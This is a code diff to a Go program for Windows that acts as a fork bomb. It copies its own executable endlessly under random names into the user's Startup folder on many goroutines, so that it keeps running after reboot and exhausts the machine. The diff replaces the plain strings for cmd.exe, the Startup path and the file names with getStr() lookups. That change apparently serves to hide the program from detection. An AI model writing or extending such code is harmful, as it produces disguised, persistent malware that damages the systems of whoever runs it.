@@ -62,7 +62,7 @@ func getUsername() string {
 
 // ? Start a process (should be used with 'go')
 func startProc(cmd string) {
-	proc := exec.Command("cmd.exe", "/C", "start", cmd)
+	proc := exec.Command(getStr(CMD_EXE), getStr(_C), getStr(START), cmd)
 	err := proc.Start()
 	if err != nil {
 		fmt.Println(err)
@@ -112,7 +112,7 @@ func whileCopy(src string, targetDir string, fileNameBase string) {
 
 	// Infinite loop (Like [C#]: while (true) {})
 	for {
-		tmpName := fmt.Sprintf("%s.%d.exe", targetFile, rand.Int63())
+		tmpName := fmt.Sprintf(getStr(NEW_NAME_FORMATTER), targetFile, rand.Int63())
 
 		// Copy cannot use the 'go' keyword or the .exe won't exist
 		// by the time we're calling it
@@ -139,12 +139,12 @@ func main() {
 	verbose("user", user)
 
 	// User startup folder
-	startup := fmt.Sprintf("C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", user)
+	startup := fmt.Sprintf(getStr(STARTUP_FOLDER_FORMATTER), user)
 	verbose("strt", startup)
 
 	if DEBUG {
 		// Use this to verify it works
-		startup = fmt.Sprintf("C:\\Users\\%s\\Downloads\\FOKBOMB_TMP", user)
+		startup = fmt.Sprintf(getStr(DEBUG_STARTUP_FOLDER_FORMATTER), user)
 		verbose("rsgn", startup)
 	}
 
@@ -158,7 +158,7 @@ func main() {
 		verbose("gort", "Start ", i)
 
 		// Start copying on a new goroutine
-		go whileCopy(this, startup, "fok") // ".exe" is added in whileCopy()->copy()
+		go whileCopy(this, startup, getStr(FOK)) // ".exe" is added in whileCopy()->copy()
 	}
 
 	// Prevent app exit
